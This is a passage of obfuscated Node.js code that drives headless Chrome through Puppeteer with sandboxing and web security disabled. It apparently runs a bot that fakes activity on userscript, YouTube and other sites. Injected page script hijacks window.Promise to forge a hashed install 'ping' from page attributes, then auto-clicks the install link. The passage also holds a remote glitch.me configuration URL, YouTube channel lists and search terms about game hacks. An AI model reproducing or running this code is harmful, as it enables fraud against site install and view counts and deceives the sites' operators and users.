-0xa + -0x14bf + 0x323f * 0x1 & -0x43 * -0x5 + 0x3d * -0x8b + -0x1 * -0x200f) << y[0x1e9a + 0x541 * -0x7 + 0x630 & N++], P[N >> -0x11 * 0x163 + 0x1672 + -0x61 * -0x3] |= (-0x2 * 0x11d1 + 0x3 * 0x29f + -0x1 * -0x1c45 | L >> 0x101d * -0x2 + -0xa4a + 0x63 * 0x6e & -0x12e * 0x6 + -0x21a5 + 0x28f8) << y[-0x4c3 + 0x21a3 + -0x1cdd & N++], P[N >> -0xe * -0x242 + -0x1dca + 0x8 * -0x3a] |= (0x1 * 0x12c1 + -0x7b0 + 0x1 * -0xa91 | 0x2 * -0xddb + -0x1b1a + -0x370f * -0x1 & L) << y[0x1b2f + -0x12 * 0x13c + -0x4f4 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1bfa * 0x1 + 0x7 * 0x16f + -0x25c3 ? (this['block'] = P[0x92 * 0x35 + -0x3 * 0xb32 + 0x36c], this['start'] = N - (0xb5f * -0x3 + 0x1bda + -0x1 * -0x683), this['hash'](), this['hashed'] = -0x639 + 0x927 + 0x7 * -0x6b) : this['start'] = N;
                }
                return this['bytes'] > -0x1878246b7 + 0x58a1 * 0x4bbf3 + 0xe3ec8ae3 && (this['hBytes'] += this['bytes'] / (0x6878 * -0x4192b + 0x1f8305504 + 0xb3f4ef24) << 0x1 * 0x12d3 + 0x1530 + -0x2803, this['bytes'] = this['bytes'] % (-0xc6340a30 + -0xab1f8a3c + 0x2569c * 0x10b6d)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x18 + 0x1 * -0x2479 + 0x2462;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x224b + 0x32c + -0x17f * 0x19] = this['block'], J[K >> 0xf15 + 0x1332 + -0x2245] |= x[0x769 * -0x3 + 0xfe1 + 0x65d & K], this['block'] = J[0xff6 + -0x1 * -0xd6f + -0x1d55], K >= 0x6bf * -0x4 + -0xf64 + 0x2a98 && (this['hashed'] || this['hash'](), J[0xe3c + -0x1063 + 0x1d * 0x13] = this['block'], J[-0x9c + -0x412 + -0x25f * -0x2] = J[0x4b2 + 0x1 * 0x16c3 + -0x3ec * 0x7] = J[0x1 * 0xb5c + 0x11c + -0x6e * 0x1d] = J[-0x1 * 0x355 + -0x8db + -0x1 * -0xc33] = J[-0x1bc4 + 0x27f * -0xd + 0x3c3b] = J[0x1bed + 0x1c * -0x1 + -0xde6 * 0x2] = J[-0x269 * -0x10 + -0x1020 + -0x166a] = J[0x14 * 0xe9 + -0xa1b * 0x3 + 0xc24] = J[-0x1 * -0x50e + 0x1c * -0x134 + 0x1caa] = J[0x17 * 0x139 + -0x110a + -0xe * 0xca] = J[-0x100c + -0x702 * 0x2 + 0x1 * 0x1e1a] = J[-0x1318 + -0x12d8 + 0x3 * 0xca9] = J[-0x1cd0 + -0x1 * -0x2669 + -0x1e9 * 0x5] = J[0x216a + 0x24ee + -0x1 * 0x464b] = J[-0x949 + 0x1 * -0x446 + -0x55 * -0x29] = J[-0x1a0b + 0x1 * 0x1469 + -0x1 * -0x5b1] = 0x13 * 0x1c5 + 0x1 * -0x8f2 + -0x18ad), J[-0x127d * -0x1 + -0x2588 * -0x1 + -0x37f7 * 0x1] = this['hBytes'] << -0x6 * 0x3db + -0x2f * 0x2b + 0x1f0a | this['bytes'] >>> -0xb * -0x28d + 0xaf * -0x29 + 0x15, J[-0x1 * -0xf28 + 0x2 * -0x256 + -0xa6d] = this['bytes'] << -0x4c7 + 0x1 * 0xf89 + -0xabf, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x7 * -0x1ec + -0x18 * -0xd9 + -0x21bc; J < -0x1fa4 + -0x1708 + -0x495 * -0xc; ++J)
                K = Q[J - (0x148d + 0x1e8f * 0x1 + -0x3319)] ^ Q[J - (0x1ac + 0x35f * 0x1 + -0x1 * 0x503)] ^ Q[J - (0x2352 + -0x16b2 + -0xc92)] ^ Q[J - (0x259c + 0x645 + -0x2bd1)], Q[J] = K << -0x1 * 0x1331 + -0x2 * 0xb7 + 0x14a0 | K >>> 0xd * -0x15 + 0x1 * -0x22e1 + 0x2411;
              for (J = 0xb17 * -0x1 + 0x630 + 0x4e7; J < 0x2464 + 0x3ca + -0x281a; J += -0x164 + -0x138e + 0x14f7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xc6c + 0x144c + -0x20b3 | L >>> 0x13 * 0x128 + -0x1d5 * -0x14 + 0x11 * -0x371) + (M & N | ~M & O) + P + (0x30c06d32 + -0x9cea30ef + 0xc6ac3d56) + Q[J] << 0x1 * -0x793 + 0x20aa * -0x1 + 0x283d) << -0x1baf * -0x1 + -0x2 * 0x135a + -0x1d7 * -0x6 | P >>> -0x168 * -0x7 + 0xab * 0x1 + 0x48 * -0x25) + (L & (M = M << -0x2c1 * 0x1 + 0x3 * 0x991 + -0x19d4 | M >>> -0xe83 + -0xd0 * 0x30 + 0x1 * 0x3585) | ~L & N) + O + (-0x2dc587a2 + 0x7559b1d2 + 0x12ee4f69) + Q[J + (0x191 * -0x13 + -0x4 * 0x925 + 0x4258)] << 0x18 * -0x95 + 0xa1a + 0x3de) << 0x63d + 0x21e7 + 0x281f * -0x1 | O >>> -0x1 * -0xffe + 0x3 * 0xa9f + -0x2 * 0x17e0) + (P & (L = L << 0x3 * 0x71b + -0x1dc3 * 0x1 + 0x890 | L >>> 0xaeb + 0x1a52 + -0x253b) | ~P & M) + N + (0x9c7aff8 + -0x42 * 0x32eb3f + 0x5ddb6fdf) + Q[J + (-0x2459 + -0x2 * -0x515 + 0x95 * 0x2d)] << 0xc41 * 0x1 + 0x2 * -0xbb9 + -0xbf * -0xf) << -0x2c0 + -0x15b1 + 0x65 * 0x3e | N >>> -0x2353 * -0x1 + 0x1 * -0xf4d + 0x13eb * -0x1) + (O & (P = P << -0x2 * 0x943 + 0x264e + 0x2 * -0x9d5 | P >>> 0x1721 + 0x1425 + -0x1a * 0x1aa) | ~O & L) + M + (-0x6a13f595 + 0x3418fcf * -0x21 + 0x11e2780d * 0x11) + Q[J + (-0x11f6 + -0x149 * 0x1d + 0x373e)] << -0x77 + 0x3 * -0x49d + 0xe4e) << 0x59 * 0x42 + 0x1fa * 0x11 + 0x1d * -0x1f3 | M >>> -0x6aa + -0x1e0a + 0x3 * 0xc45) + (N & (O = O << -0x1ced + 0x1 * 0x1747 + 0x3 * 0x1ec | O >>> -0x490 * -0x1 + 0x4ec + -0x97a) | ~N & P) + L + (-0x5a093d12 + 0x7ee76111 + 0x35a4559a) + Q[J + (-0x2014 + 0x1d72 + 0x2a6)] << 0xf4d * 0x1 + -0x419 * -0x5 + 0x2 * -0x11e5, N = N << 0x7f * 0x1d + 0x886 + -0x48f * 0x5 | N >>> -0x810 + -0x19a4 * 0x1 + 0x21b6;
              for (; J < 0x2c2 * 0x3 + 0x1efe * -0x1 + 0x3 * 0x7a0; J += -0x278 + 0x158 * -0x8 + -0x1 * -0xd3d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1b11 + -0x1af + -0x97 * 0x2b | L >>> -0x82c + 0x50 + 0x1 * 0x7f7) + (M ^ N ^ O) + P + (0x43fb73e * -0x21 + -0xd1a9320e + 0x1ccb9bcad) + Q[J] << 0xc75 + 0x4 * 0x7bb + -0x2b61) << 0x85d * -0x1 + -0x2 * -0x1342 + -0x26 * 0xcb | P >>> -0x1 * 0x2188 + -0xf17 + 0x30ba) + (L ^ (M = M << -0x1 * -0x566 + -0x41 + -0x63 * 0xd | M >>> -0x14e4 + -0xe * -0x10d + 0x630) ^ N) + O + (0x2 * 0x3886f2d9 + -0x1a5 * -0x7b8539 + -0xcd5610ce) + Q[J + (0x766 * 0x3 + -0x3 * -0x83b + 0x1 * -0x2ee2)] << -0x5c7 * 0x5 + -0x236 + 0x1f19) << -0x17a7 * 0x1 + 0x1 * -0x103d + 0x27e9 | O >>> 0x279 + -0x92e + -0x2 * -0x368) + (P ^ (L = L << -0xaa3 + 0x2167 + 0x1a * -0xdf | L >>> -0x270d + 0x9f7 + 0x428 * 0x7) ^ M) + N + (0x9ba21567 + -0x6d2460f9 + -0x3ad * -0x11825f) + Q[J + (-0x60d * -0x3 + 0x103 * 0x22 + 0x1 * -0x348b)] << 0x2668 + 0x196e + -0x3fd6) << 0xa44 + -0x26e0 + 0x1ca1 | N >>> -0x1e2b + -0x35 * 0x52 + -0x6 * -0x7e0) + (O ^ (P = P << -0x3c2 + 0x1 * -0x257d + -0x295d * -0x1 | P >>> -0x5ff * -0x3 + -0x21e9 * 0x1 + 0xfee) ^ L) + M + (0x1 * -0xa617d88f + -0x34b * 0x41740c + 0x1ec7ae7b4) + Q[J + (0x36f + -0x803 + -0x1 * -0x497)] << 0x1afa + 0xb8c * -0x1 + -0xf6e) << 0x12c5 + 0xc6a + -0x1 * 0x1f2a | M >>> 0x249e + 0x1 * -0x547 + -0x1f3c) + (N ^ (O = O << 0x23b1 + -0x18ea * -0x1 + 0xc19 * -0x5 | O >>> 0x1896 + 0x2157 + -0x39eb) ^ P) + L + (-0x34d3ecdc + 0x1c71ee3 * -0x4f + -0x1 * -0x13020608a) + Q[J + (0x148f + 0x22 * -0x115 + 0x1 * 0x103f)] << 0x11 * -0x89 + -0x38b * -0xa + -0x1a55, N = N << 0x4 * -0x8c9 + -0x1 * -0x19fa + -0x2c * -0x36 | N >>> 0x5d9 * 0x2 + 0x3 * -0xc4d + -0x1937 * -0x1;
              for (; J < -0x1b15 * -0x1 + -0x115e + -0x97b; J += 0x2 * -0xc3d + -0xaed + 0x236c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x25ae + -0x17f * 0x1 + -0x2732 * -0x1 | L >>> 0x23bb + -0x1608 + -0xd98) + (M & N | M & O | N & O) + P - (-0xc52c1 * -0x73 + -0x3 * 0x99e9cc5 + 0xb59e910 * 0xc) + Q[J] << -0xc * -0xe1 + -0x409 + -0x683) << -0x2 * 0xaf + -0x1e87 + 0x1fea | P >>> -0x1f30 + -0x6ad * 0x1 + 0x25f8) + (L & (M = M << -0x13fe + 0xaf9 + 0x923 | M >>> 0x9f8 + -0x1 * -0x14fd + 0x8b * -0x39) | L & N | M & N) + O - (0xcadbf28b + 0xab228793 * 0x1 + -0x1051a36fa) + Q[J + (0x10ba + 0x1e1f * -0x1 + 0xd66)] << 0x7fc * 0x4 + 0x1208 + -0x7b * 0x68) << -0x1 * 0x86d + 0x39f * 0x2 + -0x134 * -0x1 | O >>> 0x1f5d + 0x2c2 * -0x7 + 0xc * -0xff) + (P & (L = L << -0x22dc + 0x1d0a + 0x5f0 | L >>> -0xedc + -0x35 * -0x26 + -0x38 * -0x20) | P & M | L & M) + N - (-0xaf4a0f3a + 0x3a1c0bd6 * 0x3 + 0x71da2edc) + Q[J + (0x9fa + -0x1f84 + 0x563 * 0x4)] << -0x53 + 0x26 * -0x5f + 0xe6d * 0x1) << -0x251b + 0x544 + 0x7f7 * 0x4 | N >>> -0x851 + -0x1ef * 0x5 + 0x1a5 * 0xb) + (O & (P = P << -0xfee + 0x13 * -0x73 + 0x1895 * 0x1 | P >>> 0x1f04 + 0x1194 + 0x2b3 * -0x12) | O & L | P & L) + M - (-0xc1bf5519 * -0x1 + 0x3ad06fad + -0x16 * 0x6594013) + Q[J + (-0x243 + -0x1aa9 + 0x1cef * 0x1)] << -0x10cf * 0x1 + 0xa * 0x262 + -0x705) << 0x5de * -0x2 + 0x1 * 0x58b + 0x636 | M >>> -0x1462 + 0x32b * 0xb + -0xe5c) + (N & (O = O << 0x2211 + -0x23b * 0x3 + -0x1b42 * 0x1 | O >>> -0x51 * 0x3 + -0x1d2c + 0xa0b * 0x3) | N & P | O & P) + L - (-0x419c182d + 0x1 * 0xc88cc097 + -0x160c6546) + Q[J + (-0x1a * 0xc5 + 0x1 * 0x1003 + 0x403)] << -0xe07 + 0x78b * -0x2 + -0x1d * -0x101, N = N << -0x1061 + -0x2e3 * -0x6 + -0x1 * 0xd3 | N >>> 0x17f7 + 0x1b9d + 0x3392 * -0x1;
              for (; J < 0x2 * -0x3e + -0x511 + 0x5dd; J += -0x195e + -0x1a6d + 0x33d0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1883 * -0x1 + -0x268d * -0x1 + 0x3f0b * -0x1 | L >>> 0x2ab + 0x1df * -0x6 + 0x8aa) + (M ^ N ^ O) + P - (-0x2b9eab11 + 0x1566aab1 * -0x1 + 0x76a293ec) + Q[J] << 0x14b * -0x17 + 0x9ae + -0x5 * -0x403) << -0x10ad + -0x1 * 0x2296 + 0x3348 * 0x1 | P >>> -0x1849 + 0x24d2 + -0xc6e) + (L ^ (M = M << 0xc5 * 0x2e + -0x2c5 * 0xb + 0x1 * -0x4d1 | M >>> 0x10e8 + 0x179a + -0x2880) ^ N) + O - (0x42c9eeb4 + 0xbea01 * 0x673 + -0x5a02d4fd) + Q[J + (-0x7cd * 0x3 + -0x14e4 + 0x2c4c)] << -0x3b * -0x1d + 0x1d97 + -0x1223 * 0x2) << 0x233d + 0xdde + 0x2 * -0x188b | O >>> -0x124d * 0x1 + 0x3 * -0xac7 + -0x32bd * -0x1) + (P ^ (L = L << -0x821 * 0x1 + 0x21d * -0x5 + -0x4b4 * -0x4 | L >>> 0x1705 + -0x32 * 0x73 + -0x1 * 0x8d) ^ M) + N - (-0x36fa15e + 0x53438 * 0x1463 + 0x3f028 * -0xc74) + Q[J + (-0x180d + 0xcaf + 0xb60)] << -0x59 * -0x6b + 0x97 * 0x25 + -0x3b06) << 0x3 * 0x5e7 + 0x1 * 0x1c6 + -0x1376 | N >>> 0x1 * -0xca1 + -0x1106 + 0x1dc2) + (O ^ (P = P << 0x3d * 0x9 + -0x2ce * -0xc + 0x1 * -0x23af | P >>> -0x4 * 0x917 + -0x106f * 0x2 + 0x453c) ^ L) + M - (-0x60f373f3 + -0x2c6460ae + -0x27bb * -0x4e831) + Q[J + (0x1ad5 + 0x80 * 0x1d + -0x2952)] << 0x3 * -0xabf + -0x2f * -0x9e + -0x1 * -0x33b) << -0x1778 + -0x1cbb + -0xd0e * -0x4 | M >>> 0x3c0 + -0x15 * 0x7 + -0x312) + (N ^ (O = O << 0x1 * 0x4a9 + -0x3ed + -0x1 * 0x9e | O >>> 0x270a + 0x23db + 0x3f1 * -0x13) ^ P) + L - (-0x42420c29 + -0x21fc905b + 0x99dbdaae * 0x1) + Q[J + (-0x1815 + -0x13ef + -0x8 * -0x581)] << -0x1da * 0x2 + 0x26fe + -0x234a, N = N << 0x4cb + -0xb92 + -0x5 * -0x161 | N >>> 0xf29 + 0xcc * 0x20 + -0x3 * 0xd8d;
              this['h0'] = this['h0'] + L << -0x2f * -0xa3 + 0xbbf * -0x1 + 0xd * -0x166, this['h1'] = this['h1'] + M << 0x85a + -0x4 * -0x4b7 + 0x9 * -0x306, this['h2'] = this['h2'] + N << -0xb89 * -0x1 + -0x125d + 0x1b5 * 0x4, this['h3'] = this['h3'] + O << -0x47d + 0x198b + -0xa * 0x21b, this['h4'] = this['h4'] + P << -0x1 * -0x401 + 0x4b * 0x13 + -0x992;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xc * -0x9d + 0x5d * 0x1a + -0xb * 0x2e & -0x257 * 0xf + -0x1949 + 0x3c71 * 0x1] + w[J >> 0x1 * -0x2381 + 0x2641 * 0x1 + -0x2a8 & -0xbc2 + 0xfb2 + -0x3e1] + w[J >> 0xaa6 * -0x2 + 0x2 * 0x58b + 0x525 * 0x2 & 0x4cc * 0x1 + 0x745 * 0x1 + -0xc02] + w[J >> 0x2 * -0x916 + -0x19a5 + 0x2be1 & 0x1 * 0x269e + 0x1 * 0x2631 + 0x20 * -0x266] + w[J >> -0x76b + -0x2145 + 0x28bc & -0x297 + 0x1472 + -0x11cc] + w[J >> 0x4f * 0x11 + 0x153b + -0x1a72 & 0x2524 + 0x1 * -0x236d + -0x1a8] + w[J >> -0x5 * -0x5b0 + -0x2094 + 0x428 & -0x56d + -0x1 * 0x236b + 0x28e7] + w[-0x97a + 0x8c3 * 0x2 + -0x7fd & J] + w[K >> -0x571 + 0x4 * 0x446 + -0xb8b & 0x1 * 0x996 + 0x15 * -0xf3 + 0x25 * 0x48] + w[K >> -0x1 * 0x145 + -0x371 * -0x7 + -0xb5d * 0x2 & -0x2 * -0x10ad + 0x1a1b + -0x2 * 0x1db3] + w[K >> -0x5e * 0x4d + -0xa05 * -0x3 + -0x1 * 0x1b5 & -0x30 * 0x53 + -0x1 * -0x1286 + -0x2e7 * 0x1] + w[K >> 0xaed + -0x1 * -0x1444 + -0x1f21 * 0x1 & 0x11a5 + -0x2 * -0x1070 + -0x3276] + w[K >> -0x1013 + -0x3cd + 0x13ec & 0x1697 * -0x1 + -0xbfc + -0x2aa * -0xd] + w[K >> -0x5 * 0x175 + -0x1e6b + -0x3 * -0xc94 & 0x152f * -0x1 + -0xf9f + -0x24dd * -0x1] + w[K >> -0x1 * 0x265e + -0x143 + 0xc7 * 0x33 & -0x1 * 0x1448 + 0xe54 + -0x3 * -0x201] + w[-0x11a5 * -0x2 + -0x3 * 0xc6f + -0x6a * -0x5 & K] + w[L >> -0xeac + 0x22bb * 0x1 + -0x13f3 & -0x581 * -0x3 + -0x874 + -0x80 * 0x10] + w[L >> -0x19ed * 0x1 + 0x2032 + -0x62d & -0x1524 + 0x1d * 0x83 + 0x65c] + w[L >> 0x69c + -0x1052 + 0x9ca & 0x1c33 * -0x1 + 0x2 * 0xf67 + 0x4 * -0xa3] + w[L >> 0xc92 + 0x431 + -0x10b3 & 0x5d * -0x63 + -0x2692 + -0x554 * -0xe] + w[L >> 0x80c + 0x1ab6 + 0x1 * -0x22b6 & -0x203b + -0xe39 + -0x2e83 * -0x1] + w[L >> 0xbd3 * 0x1 + 0xe * -0x131 + 0x3 * 0x1a1 & 0xd35 + 0x1 * 0xeae + -0x1bd4] + w[L >> 0x432 + 0xb3 * 0xa + 0x34 * -0x37 & -0x1729 + -0x33b + 0x1a73 * 0x1] + w[0x1dc0 + 0x1 * -0x1b55 + -0x25c & L] + w[M >> 0x46d * 0x5 + -0x24c6 + 0xec1 & -0x33b * -0x1 + -0x22ac + 0x1f80] + w[M >> -0xd13 * -0x1 + -0x239b + 0x16a0 & 0x1058 + -0x32 * -0xc1 + -0x35fb] + w[M >> 0x17 * 0x59 + -0x1 * 0x1d0 + 0x1 * -0x61b & -0x1317 + -0x64c + 0x1972] + w[M >> 0x137d * -0x1 + 0x1947 + -0x5ba & 0x3b9 * 0x2 + -0x10fc + 0x5b * 0x1b] + w[M >> -0x944 + 0x1876 + -0xf26 & 0x1 * 0x44e + -0x2426 + 0x1fe7 * 0x1] + w[M >> 0x90c + -0x3c + -0x1 * 0x8c8 & -0x1de6 + 0x1 * -0x1f7d + 0x41 * 0xf2] + w[M >> -0x592 + -0x11 * 0xe3 + 0x1 * 0x14a9 & -0x17a5 + 0x2d8 + 0xf * 0x164] + w[-0xa9 * 0x15 + -0x2 * -0x11c3 + -0x159a & M] + w[N >> 0x610 + -0x1181 + 0xb8d & 0x153 + 0x1c61 + -0x1da5] + w[N >> -0x1d7f + 0x232 + 0x1b65 & -0x9b8 + 0x18e3 + -0xf1c] + w[N >> -0x614 + 0x1240 + -0x12 * 0xac & -0x1 * -0x2b5 + 0x2611 + -0x28b7] + w[N >> -0x19ed * -0x1 + -0x3e5 * 0x7 + -0x1 * -0x166 & 0xdf2 * 0x2 + -0x1d72 + 0x19d] + w[N >> -0xd * 0x88 + 0x1230 * -0x1 + 0x1924 & -0xcc4 + 0x7fa + 0x4d9] + w[N >> 0x17d1 + 0x57 * 0x47 + -0x2fea & 0xa4 * -0x17 + -0x1 * 0x1ef2 + -0x515 * -0x9] + w[N >> -0x191 * 0xb + -0x18 * 0x97 + 0x1f67 & 0x1 * -0xef5 + 0x12 * 0x202 + -0xd0 * 0x1a] + w[0xfcc + -0x3 * -0x5c + -0xcd * 0x15 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x3 * -0x4fd + -0x1 * 0x1af2 + 0x1 * 0x2a01 & 0x1d59 + -0x23d7 + 0x77d,
                J >> -0x1 * -0x265 + -0x3 * -0x4f7 + -0x113a & 0x1648 + -0x14 * 0xfe + -0x171,
                J >> 0x1c6d + 0x257a + -0x41df & -0x1 * 0x1c8b + 0x16d + -0x95f * -0x3,
                -0x787 + 0x25de + -0x1d58 & J,
                K >> 0x1a73 * 0x1 + 0x1b * 0x9 + -0x1b4e & 0x379 + -0x10d5 + -0xf5 * -0xf,
                K >> 0x21b8 + 0x2 * -0xe18 + 0x7 * -0xc8 & -0x23cb + -0xc5 * 0x1c + 0x1372 * 0x3,
                K >> 0x73 * 0xb + -0xfce + 0x1 * 0xae5 & -0xea2 + 0x1ac * 0x3 + 0xa9d,
                0x1b55 * 0x1 + 0x2c * 0xb1 + -0xa * 0x5ad & K,
                L >> -0x11 * 0xd9 + 0xb17 * 0x2 + -0x7ad & -0x4 * 0x8e + -0x92 * -0x18 + -0xa79,
                L >> 0x106 * -0x24 + 0x1bd * -0x13 + 0x45ef & 0xe * -0xd9 + -0x5 * -0x45d + 0xc * -0xbf,
                L >> -0x1d * -0x6d + 0x6ec + -0xc5 * 0x19 & 0x1278 + 0x823 + -0x199c,
                -0x2 * -0x81b + -0xa80 + -0x4b7 & L,
                M >> -0x14d5 + -0x11 * 0x223 + 0x3940 & 0x262e * -0x1 + 0x1 * -0xb2d + 0x325a,
                M >> 0x12a * 0x2 + 0x136 * 0x3 + -0x5e6 & -0xb82 + 0x189 + -0x6c * -0x1a,
                M >> -0x1 * -0x1ab9 + -0x17d5 + -0x2dc & -0x13c3 + 0x883 * -0x1 + 0x1d45,
                -0x19a3 + 0x1110 + 0x992 & M,
                N >> 0x25b6 + -0x17dd + -0xdc1 * 0x1 & 0x12da * -0x1 + -0xc7 * -0x17 + 0x1f8,
                N >> -0x625 + -0xcf3 + 0x1328 & 0x2bd * 0x2 + 0x17c * 0x4 + -0xa6b,
                N >> -0x3 * -0xb71 + -0x12c5 + -0xf86 & -0xb8d + -0x2134 + 0x2dc0,
                0x1 * -0x22bf + -0x2 * 0x12b2 + 0x4922 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2369 + 0x1 * -0xd03 + -0x2 * 0xb29), (K = new DataView(J))['setUint32'](-0xf2b + 0x12f5 * 0x1 + -0x3ca, this['h0']), K['setUint32'](0x2429 * 0x1 + -0x217 * -0xd + -0x1 * 0x3f50, this['h1']), K['setUint32'](-0x1aad + 0x1ea3 + 0x1 * -0x3ee, this['h2']), K['setUint32'](0x1 * 0xef + 0x1aa * 0x1 + -0x28d, this['h3']), K['setUint32'](-0x433 * 0x2 + -0x3 * -0xbb9 + -0x1ab5, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1bc7 + -0x9a4 + -0x5d * -0x67];
        return window[V(0x10)] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x14a1 + 0x1 * -0x1162 + 0x107 * 0x25;
            J[-0xc2 * 0x4 + 0x2665 + -0x235d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x25eb + 0x1084 + -0x3 * 0x1225] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xf8a + -0xdc6 + -0x5dd * -0x5), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1a * -0x1d + 0x2 * 0x25f + -0x7af * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1c * -0x3 + 0x1b * -0x32 + -0x9 * -0x146), Promise['resolve'](0xb53 + -0x290 + -0x8c2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xf4a + -0x26 * -0x39 + 0xbe * -0x20; j < -0x1 * 0x1305 + 0xeed * -0x1 + 0x1 * 0x21f3; j++)
    i();
}
const NETWORK_PATIENCE = -0x25 * -0x155 + 0x211b + -0x3324 + (0x1017 + 0x267 + -0x6c6) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x827 + -0x8e * -0x38 + -0x1 * 0x2734) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x12fb * 0x2 + -0xc7 * 0x5 + 0x29d9);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xad * 0x5 + -0x1 * -0x23c1 + -0x2722; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 